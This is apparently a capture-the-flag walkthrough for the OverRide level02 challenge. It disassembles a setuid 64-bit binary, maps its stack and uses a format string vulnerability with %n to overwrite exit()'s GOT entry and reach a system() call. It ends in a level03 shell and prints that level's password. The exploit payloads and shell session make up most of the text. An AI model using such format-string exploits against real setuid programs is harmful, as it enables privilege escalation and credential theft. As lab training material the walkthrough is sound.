# Level02

## Walkthrough

We list the files in the current home directory.

```bash
level02@OverRide:~$ ls -lA
total 21
-rw-r--r--  1 level02 level02  220 Sep 10  2016 .bash_logout
lrwxrwxrwx  1 root    root       7 Sep 13  2016 .bash_profile -> .bashrc
-rw-r--r--  1 level02 level02 3533 Sep 10  2016 .bashrc
-rw-r--r--+ 1 level02 level02   41 Oct 19  2016 .pass
-rw-r--r--  1 level02 level02  675 Sep 10  2016 .profile
-rwsr-s---+ 1 level03 users   9452 Sep 10  2016 level02
level02@OverRide:~$ file level02 
level02: setuid setgid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xf639d5c443e6ff1c50a0f8393461c0befc329e71, not stripped
```

The file `level02` is owned by **level03** and has the setuid bit.  
Unlike in previous levels, the executable is not 32 bits, but 64 bits.

We list the functions inside the executable.

```
(gdb) info functions
All defined functions:

Non-debugging symbols:
0x0000000000400640  _init
0x0000000000400670  strncmp
0x0000000000400670  strncmp@plt
0x0000000000400680  puts
0x0000000000400680  puts@plt
0x0000000000400690  fread
0x0000000000400690  fread@plt
0x00000000004006a0  fclose
0x00000000004006a0  fclose@plt
0x00000000004006b0  system
0x00000000004006b0  system@plt
0x00000000004006c0  printf
0x00000000004006c0  printf@plt
0x00000000004006d0  strcspn
0x00000000004006d0  strcspn@plt
0x00000000004006e0  __libc_start_main
0x00000000004006e0  __libc_start_main@plt
0x00000000004006f0  fgets
0x00000000004006f0  fgets@plt
0x0000000000400700  fopen
0x0000000000400700  fopen@plt
0x0000000000400710  exit
0x0000000000400710  exit@plt
0x0000000000400720  fwrite
0x0000000000400720  fwrite@plt
0x0000000000400730  _start
0x000000000040075c  call_gmon_start
0x0000000000400780  __do_global_dtors_aux
0x00000000004007f0  frame_dummy
0x0000000000400814  main
0x0000000000400ac0  __libc_csu_init
0x0000000000400b50  __libc_csu_fini
0x0000000000400b60  __do_global_ctors_aux
0x0000000000400b98  _fini
```

There is 1 user-defined function: `main()`.

```
(gdb) disas main
Dump of assembler code for function main:
   0x0000000000400814 <+0>:     push   rbp
   0x0000000000400815 <+1>:     mov    rbp,rsp
   0x0000000000400818 <+4>:     sub    rsp,0x120
   0x000000000040081f <+11>:    mov    DWORD PTR [rbp-0x114],edi
   0x0000000000400825 <+17>:    mov    QWORD PTR [rbp-0x120],rsi
   0x000000000040082c <+24>:    lea    rdx,[rbp-0x70]
   0x0000000000400830 <+28>:    mov    eax,0x0
   0x0000000000400835 <+33>:    mov    ecx,0xc
   0x000000000040083a <+38>:    mov    rdi,rdx
   0x000000000040083d <+41>:    rep stos QWORD PTR es:[rdi],rax
   0x0000000000400840 <+44>:    mov    rdx,rdi
   0x0000000000400843 <+47>:    mov    DWORD PTR [rdx],eax
   0x0000000000400845 <+49>:    add    rdx,0x4
   0x0000000000400849 <+53>:    lea    rdx,[rbp-0xa0]
   0x0000000000400850 <+60>:    mov    eax,0x0
   0x0000000000400855 <+65>:    mov    ecx,0x5
   0x000000000040085a <+70>:    mov    rdi,rdx
   0x000000000040085d <+73>:    rep stos QWORD PTR es:[rdi],rax
   0x0000000000400860 <+76>:    mov    rdx,rdi
   0x0000000000400863 <+79>:    mov    BYTE PTR [rdx],al
   0x0000000000400865 <+81>:    add    rdx,0x1
   0x0000000000400869 <+85>:    lea    rdx,[rbp-0x110]
   0x0000000000400870 <+92>:    mov    eax,0x0
   0x0000000000400875 <+97>:    mov    ecx,0xc
   0x000000000040087a <+102>:   mov    rdi,rdx
   0x000000000040087d <+105>:   rep stos QWORD PTR es:[rdi],rax
   0x0000000000400880 <+108>:   mov    rdx,rdi
   0x0000000000400883 <+111>:   mov    DWORD PTR [rdx],eax
   0x0000000000400885 <+113>:   add    rdx,0x4
   0x0000000000400889 <+117>:   mov    QWORD PTR [rbp-0x8],0x0
   0x0000000000400891 <+125>:   mov    DWORD PTR [rbp-0xc],0x0
   0x0000000000400898 <+132>:   mov    edx,0x400bb0
   0x000000000040089d <+137>:   mov    eax,0x400bb2
   0x00000000004008a2 <+142>:   mov    rsi,rdx
   0x00000000004008a5 <+145>:   mov    rdi,rax
   0x00000000004008a8 <+148>:   call   0x400700 <fopen@plt>
   0x00000000004008ad <+153>:   mov    QWORD PTR [rbp-0x8],rax
   0x00000000004008b1 <+157>:   cmp    QWORD PTR [rbp-0x8],0x0
   0x00000000004008b6 <+162>:   jne    0x4008e6 <main+210>
   0x00000000004008b8 <+164>:   mov    rax,QWORD PTR [rip+0x200991]        # 0x601250 <stderr@@GLIBC_2.2.5>
   0x00000000004008bf <+171>:   mov    rdx,rax
   0x00000000004008c2 <+174>:   mov    eax,0x400bd0
   0x00000000004008c7 <+179>:   mov    rcx,rdx
   0x00000000004008ca <+182>:   mov    edx,0x24
   0x00000000004008cf <+187>:   mov    esi,0x1
   0x00000000004008d4 <+192>:   mov    rdi,rax
   0x00000000004008d7 <+195>:   call   0x400720 <fwrite@plt>
   0x00000000004008dc <+200>:   mov    edi,0x1
   0x00000000004008e1 <+205>:   call   0x400710 <exit@plt>
   0x00000000004008e6 <+210>:   lea    rax,[rbp-0xa0]
   0x00000000004008ed <+217>:   mov    rdx,QWORD PTR [rbp-0x8]
   0x00000000004008f1 <+221>:   mov    rcx,rdx
   0x00000000004008f4 <+224>:   mov    edx,0x29
   0x00000000004008f9 <+229>:   mov    esi,0x1
   0x00000000004008fe <+234>:   mov    rdi,rax
   0x0000000000400901 <+237>:   call   0x400690 <fread@plt>
   0x0000000000400906 <+242>:   mov    DWORD PTR [rbp-0xc],eax
   0x0000000000400909 <+245>:   lea    rax,[rbp-0xa0]
   0x0000000000400910 <+252>:   mov    esi,0x400bf5
   0x0000000000400915 <+257>:   mov    rdi,rax
   0x0000000000400918 <+260>:   call   0x4006d0 <strcspn@plt>
   0x000000000040091d <+265>:   mov    BYTE PTR [rbp+rax*1-0xa0],0x0
   0x0000000000400925 <+273>:   cmp    DWORD PTR [rbp-0xc],0x29
   0x0000000000400929 <+277>:   je     0x40097d <main+361>
   0x000000000040092b <+279>:   mov    rax,QWORD PTR [rip+0x20091e]        # 0x601250 <stderr@@GLIBC_2.2.5>
   0x0000000000400932 <+286>:   mov    rdx,rax
   0x0000000000400935 <+289>:   mov    eax,0x400bf8
   0x000000000040093a <+294>:   mov    rcx,rdx
   0x000000000040093d <+297>:   mov    edx,0x24
   0x0000000000400942 <+302>:   mov    esi,0x1
   0x0000000000400947 <+307>:   mov    rdi,rax
   0x000000000040094a <+310>:   call   0x400720 <fwrite@plt>
   0x000000000040094f <+315>:   mov    rax,QWORD PTR [rip+0x2008fa]        # 0x601250 <stderr@@GLIBC_2.2.5>
   0x0000000000400956 <+322>:   mov    rdx,rax
   0x0000000000400959 <+325>:   mov    eax,0x400bf8
   0x000000000040095e <+330>:   mov    rcx,rdx
   0x0000000000400961 <+333>:   mov    edx,0x24
   0x0000000000400966 <+338>:   mov    esi,0x1
   0x000000000040096b <+343>:   mov    rdi,rax
   0x000000000040096e <+346>:   call   0x400720 <fwrite@plt>
   0x0000000000400973 <+351>:   mov    edi,0x1
   0x0000000000400978 <+356>:   call   0x400710 <exit@plt>
   0x000000000040097d <+361>:   mov    rax,QWORD PTR [rbp-0x8]
   0x0000000000400981 <+365>:   mov    rdi,rax
   0x0000000000400984 <+368>:   call   0x4006a0 <fclose@plt>
   0x0000000000400989 <+373>:   mov    edi,0x400c20
   0x000000000040098e <+378>:   call   0x400680 <puts@plt>
   0x0000000000400993 <+383>:   mov    edi,0x400c50
   0x0000000000400998 <+388>:   call   0x400680 <puts@plt>
   0x000000000040099d <+393>:   mov    edi,0x400c80
   0x00000000004009a2 <+398>:   call   0x400680 <puts@plt>
   0x00000000004009a7 <+403>:   mov    edi,0x400cb0
   0x00000000004009ac <+408>:   call   0x400680 <puts@plt>
   0x00000000004009b1 <+413>:   mov    eax,0x400cd9
   0x00000000004009b6 <+418>:   mov    rdi,rax
   0x00000000004009b9 <+421>:   mov    eax,0x0
   0x00000000004009be <+426>:   call   0x4006c0 <printf@plt>
   0x00000000004009c3 <+431>:   mov    rax,QWORD PTR [rip+0x20087e]        # 0x601248 <stdin@@GLIBC_2.2.5>
   0x00000000004009ca <+438>:   mov    rdx,rax
   0x00000000004009cd <+441>:   lea    rax,[rbp-0x70]
   0x00000000004009d1 <+445>:   mov    esi,0x64
   0x00000000004009d6 <+450>:   mov    rdi,rax
   0x00000000004009d9 <+453>:   call   0x4006f0 <fgets@plt>
   0x00000000004009de <+458>:   lea    rax,[rbp-0x70]
   0x00000000004009e2 <+462>:   mov    esi,0x400bf5
   0x00000000004009e7 <+467>:   mov    rdi,rax
   0x00000000004009ea <+470>:   call   0x4006d0 <strcspn@plt>
   0x00000000004009ef <+475>:   mov    BYTE PTR [rbp+rax*1-0x70],0x0
   0x00000000004009f4 <+480>:   mov    eax,0x400ce8
   0x00000000004009f9 <+485>:   mov    rdi,rax
   0x00000000004009fc <+488>:   mov    eax,0x0
   0x0000000000400a01 <+493>:   call   0x4006c0 <printf@plt>
   0x0000000000400a06 <+498>:   mov    rax,QWORD PTR [rip+0x20083b]        # 0x601248 <stdin@@GLIBC_2.2.5>
   0x0000000000400a0d <+505>:   mov    rdx,rax
   0x0000000000400a10 <+508>:   lea    rax,[rbp-0x110]
   0x0000000000400a17 <+515>:   mov    esi,0x64
   0x0000000000400a1c <+520>:   mov    rdi,rax
   0x0000000000400a1f <+523>:   call   0x4006f0 <fgets@plt>
   0x0000000000400a24 <+528>:   lea    rax,[rbp-0x110]
   0x0000000000400a2b <+535>:   mov    esi,0x400bf5
   0x0000000000400a30 <+540>:   mov    rdi,rax
   0x0000000000400a33 <+543>:   call   0x4006d0 <strcspn@plt>
   0x0000000000400a38 <+548>:   mov    BYTE PTR [rbp+rax*1-0x110],0x0
   0x0000000000400a40 <+556>:   mov    edi,0x400cf8
   0x0000000000400a45 <+561>:   call   0x400680 <puts@plt>
   0x0000000000400a4a <+566>:   lea    rcx,[rbp-0x110]
   0x0000000000400a51 <+573>:   lea    rax,[rbp-0xa0]
   0x0000000000400a58 <+580>:   mov    edx,0x29
   0x0000000000400a5d <+585>:   mov    rsi,rcx
   0x0000000000400a60 <+588>:   mov    rdi,rax
   0x0000000000400a63 <+591>:   call   0x400670 <strncmp@plt>
   0x0000000000400a68 <+596>:   test   eax,eax
   0x0000000000400a6a <+598>:   jne    0x400a96 <main+642>
   0x0000000000400a6c <+600>:   mov    eax,0x400d22
   0x0000000000400a71 <+605>:   lea    rdx,[rbp-0x70]
   0x0000000000400a75 <+609>:   mov    rsi,rdx
   0x0000000000400a78 <+612>:   mov    rdi,rax
   0x0000000000400a7b <+615>:   mov    eax,0x0
   0x0000000000400a80 <+620>:   call   0x4006c0 <printf@plt>
   0x0000000000400a85 <+625>:   mov    edi,0x400d32
   0x0000000000400a8a <+630>:   call   0x4006b0 <system@plt>
   0x0000000000400a8f <+635>:   mov    eax,0x0
   0x0000000000400a94 <+640>:   leave  
   0x0000000000400a95 <+641>:   ret    
   0x0000000000400a96 <+642>:   lea    rax,[rbp-0x70]
   0x0000000000400a9a <+646>:   mov    rdi,rax
   0x0000000000400a9d <+649>:   mov    eax,0x0
   0x0000000000400aa2 <+654>:   call   0x4006c0 <printf@plt>
   0x0000000000400aa7 <+659>:   mov    edi,0x400d3a
   0x0000000000400aac <+664>:   call   0x400680 <puts@plt>
   0x0000000000400ab1 <+669>:   mov    edi,0x1
   0x0000000000400ab6 <+674>:   call   0x400710 <exit@plt>
End of assembler dump.
```

The `main()` function:
- iterates 3 times from `[rbp - 0x70]`, `[rbp - 0xa0]` and `[rbp - 0x110]` to initialize respectively 96, 40 and 96 bytes to 0
- calls `fopen()` to open the file `/home/users/level03/.pass`
- calls `fread()` to read the content of the previously opened file, and stores it in `[rbp - 0xa0]`
- calls `strcspn()` to find the index of the the first `\n` character from `[rbp - 0xa0]`, and uses it to replace with `\0` at this position
- calls `fgets()` and stores user input in `[rbp - 0x70]`
- calls `strcspn()` to find the index of the the first `\n` character from `[rbp - 0x70]`, and uses it to replace with `\0` at this position
- calls `fgets()` and stores user input in `[rbp - 0x110]`
- calls `strcspn()` to find the index of the the first `\n` character from `[rbp - 0x110]`, and uses it to replace with `\0` at this position
- calls `strncmp()` to compare the value stored in `[rbp - 0x110]` with `[rbp - 0xa0]`, and calls `system()` to execute `/bin/sh` if the strings are equal
- calls `printf()` with previous user input from `[rbp - 0x70]` if the strings are not equal

We draw a diagram of the `main()` stack frame.

![Diagram of the main stack frame](./resources/level2_diagram1.png)

After looking at the stack and the size of the different `fgets()` buffer, nothing seems exploitable. But the last `printf()` call, if an invalid password is entered, prints the user input expected to hold the username. It means we can exploit it thanks to a **format string vulnerability**.  
There is a `exit()` call right after `printf()`, we can replace its address in the GOT with the address of the existing instruction calling `system()`.

Like in the [rainfall](https://github.com/naerhy/rainfall), we have to first find where the format string is stored on the stack (in order to find its position relative to the first `printf()` argument).  
As mentionned earlier, the first argument passed to `printf()` is the user input from `[rbp - 0x70]`, which is positionned many bytes away from the top of the stack, where `printf()` will keep iterating after browsing the arguments registers.  
An easier solution exists: using the second user input received with `fgets()` and stored in `[rbp - 0x110]` which, as seen on the diagram, is closer to the top of the stack than the previous one.

We display the contents of the top of the stack with an input full of specifiers.

```bash
level02@OverRide:~$ (python -c 'print("AAAABBBB" + ".%p" * 20)'; python -c 'print("CCCCDDDD")') | ./level02 
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: --[ Password: *****************************************
AAAABBBB.0x7fffffffe3f0.(nil).0x43.0x2a2a2a2a2a2a2a2a.0x2a2a2a2a2a2a2a2a.0x7fffffffe5e8.0x1f7ff9a08.0x4444444443434343.(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil).0x100000000 does not have access!
```

As expected, the string `AAAABBBB` doesn't appear in the returned values because it it is too far away from the top of stack, but we notice the value `0x4444444443434343` which corresponds to the `CCCCDDDD` string stored in `[rbp - 0x110]`. In order to target it, we have to use the 8th specifier.

Now we have to find the address of `exit()` in the GOT.

```bash
level02@OverRide:~$ objdump --dynamic-reloc ./level02 

./level02:     file format elf64-x86-64

DYNAMIC RELOCATION RECORDS
OFFSET           TYPE              VALUE 
00000000006011b8 R_X86_64_GLOB_DAT  __gmon_start__
0000000000601248 R_X86_64_COPY     stdin
0000000000601250 R_X86_64_COPY     stderr
00000000006011d8 R_X86_64_JUMP_SLOT  strncmp
00000000006011e0 R_X86_64_JUMP_SLOT  puts
00000000006011e8 R_X86_64_JUMP_SLOT  fread
00000000006011f0 R_X86_64_JUMP_SLOT  fclose
00000000006011f8 R_X86_64_JUMP_SLOT  system
0000000000601200 R_X86_64_JUMP_SLOT  printf
0000000000601208 R_X86_64_JUMP_SLOT  strcspn
0000000000601210 R_X86_64_JUMP_SLOT  __libc_start_main
0000000000601218 R_X86_64_JUMP_SLOT  fgets
0000000000601220 R_X86_64_JUMP_SLOT  fopen
0000000000601228 R_X86_64_JUMP_SLOT  exit
0000000000601230 R_X86_64_JUMP_SLOT  fwrite
```

The target address is `0000000000601228`, and the address of the instruction we wanna call instead is the one right before the `system()` call: `0x0000000000400a85`.

We request `printf()` to write 4196997 characters and target the 8th argument with `%$8n`.

> One can also specify explicitly which argument is taken, at each place where an argument is required, by writing "%m$" instead of '%' and "*m$" instead of '*', where the decimal integer m denotes the position in the argument list of the desired argument, indexed starting from 1.

```bash
level02@OverRide:~$ (python -c 'print("%4196997x" + "%8$n")'; python -c "print('\x28\x12\x60')"; cat) | ./level02 
# ...
                                                                                                    -7184 does not have access!
whoami
level03
cat /home/users/level03/.pass
Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
```
